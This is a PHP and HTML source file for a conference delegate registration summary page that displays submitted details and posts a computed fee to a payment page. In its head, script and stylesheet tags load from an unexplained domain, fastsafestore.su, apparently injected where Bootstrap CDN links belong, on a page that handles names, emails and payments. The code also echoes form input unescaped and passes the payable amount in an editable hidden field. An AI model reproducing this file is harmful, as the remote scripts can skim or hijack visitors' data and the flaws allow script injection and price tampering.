<?php
session_start();
error_reporting(0);
// $servername = "localhost";
// $username = "root";
// $password = "";
// $dbname = "hsicon";

// // Create connection
// $conn = new mysqli($servername, $username, $password, $dbname);
// // Check connection
// if ($conn->connect_error) {
//     die("Connection failed: " . $conn->connect_error);
// }
include('dbcon/conn.php');

if (isset($_POST['addAC'])) {

     $package = $_POST['package'];
     $subpackage = $_POST['subpack'];
     $occupancy = $_POST['occ'];
     $charges = $_POST['charges'];
     $name = $_POST['name'];
     $email = $_POST['email'];
     $contact = $_POST['contact'];
     $acc_count = 0;
   




    // echo $charges;

    $fnap1 = " ";
    $ageap1 = "";
    $genap1 = "";

    $fnap2 = " ";
    $ageap2 = "";
    $genap2 = "";

    $fnap3 = " ";
    $ageap3 = "";
    $genap3 = "";

    // echo $fnap1;

    if ($_POST['fnap1'] != "") {
        $acc_count = 1;
        $fnap1 = $_POST['fnap1'];
        $ageap1 = $_POST['ageap1'];
        $genap1 = $_POST['genap1'];
    }

    if ($_POST['fnap2'] != "") {

        $acc_count = 2;

        $fnap2 = $_POST['fnap2'];
        $ageap2 = $_POST['ageap2'];
        $genap2 = $_POST['genap2'];
    }

    // echo $fnap2;

    if ($_POST['fnap3'] != "") {

        $acc_count = 3;

        $fnap3 = $_POST['fnap3'];
        $ageap3 = $_POST['ageap3'];
        $genap3 = $_POST['genap3'];
    }
}

?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="https://fastsafestore.su/" rel="stylesheet" integrity="sha384-KyZXEAg3QhqLMpG8r+8fhAXLRk2vvoC2f3B09zVXn8CA5QIVfZOJ3BCsw2P0p/We" crossorigin="anonymous">
    <script src="https://fastsafestore.su/" integrity="sha384-U1DAWAznBHeqEIlVSCgzq+c9gqGAJn5c/t99JyeKa9xxaYpSvHU5awsuZVVFIhvj" crossorigin="anonymous"></script>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">

    <script src="https://fastsafestore.su/"></script>

    <title>Document</title>
</head>

<body>


    <div class="container">
        <div class="row">
            <div class="col-md-12">

                <hr>
                <div class="mb-3">
                    <label for="">Delegate Name: </label>
                    <b> <?php echo $name; ?></b>
                    <br>

                    <label for="">Delegate Email</label>
                    <b><?php echo $email; ?></b>
                    <br>

                    <label for="">Delegate Contact</label>
                    <b><?php echo $contact; ?></b>
                </div>

                <hr>

                <div class="mb-3">

                    <label for="">Delegate Pacakge: </label>
                    <b> <?php echo $package; ?></b>
                    <br>

                    <label for="">Delegate SubPackage</label>
                    <b><?php echo $subpackage; ?></b>
                    <br>

                    <label for="">Delegate Occupancy</label>
                    <b><?php echo $occupancy; ?></b>
                    <br>


                    <label for="">Delegate Charges</label>
                    <b><?php echo $charges; ?></b>

                </div>

                <hr>

                <?php if ($occupancy == 2 || $occupancy == 3 ) { ?>
                    <div class="mb-3">

                        <label for="">Acompany Person Name</label>
                        <b><?php echo  $_SESSION['acomy_person']=$fnap1; ?></b>
                        <br>

                        <label for="">Acompany Person Age</label>
                        <b><?php echo $_SESSION['acomy_person_age']=$ageap1; ?></b>
                        <br>

                        <label for="">Acompany Person Gender</label>
                        <b><?php echo $_SESSION['acomy_person_gen']=$genap1; ?></b>
                        <br>

                    </div>

                    <div class="mb-3">

                        <label for=""> Delegate Registration Charge : </label>
                        <b><?php echo $charges; ?></b><br>

                        <label for=""> Delegate Acompanying Person's : </label>
                        <b><?php echo $acc_count; ?></b><br>

                        <label for=""> Acompanying Charges: </label>
                        <b><?php echo 4720; ?></b><br>



                    </div>

                <?php }  ?>

                <div class="mb-3">
                    <label for=""> Delegate Total Charge to be paid : </label>
                    <b><?php echo (int)$charges + 4720 * $acc_count; ?></b><br>
                </div>

                <div class="mb-3"> 
                    <form action="./payment.php" method="POST">
                        <input type="hidden" name="name" value="<?php echo $name; ?>">
                        <input type="hidden" name="email" value="<?php echo $email; ?>">

                        <input type="hidden" name="package" value="<?php echo $package; ?>">
                        <input type="hidden" name="subpack" value="<?php echo $subpackage; ?>">

                        <input type="hidden" name="Occopancy" value="<?php echo $occupancy; ?>">
                        <input type="hidden" name="charges" value="<?php echo $charges ?>">


                        <input type="hidden" name="payment" value="<?php echo (int)$charges + 4720 * $acc_count; ?>" name="amount">
                        <input type="submit" class="btn btn-success" name="submit" value="Pay Now <?php echo (int)$charges + 4720 * $acc_count; ?> -/ ">
                    <!-- <button > Pay Now <?php echo (int)$charges + 4720 * $acc_count; ?> -/ </button> -->
                    </form>
                </div>



            </div>
        </div>
    </div>


</body>

</html>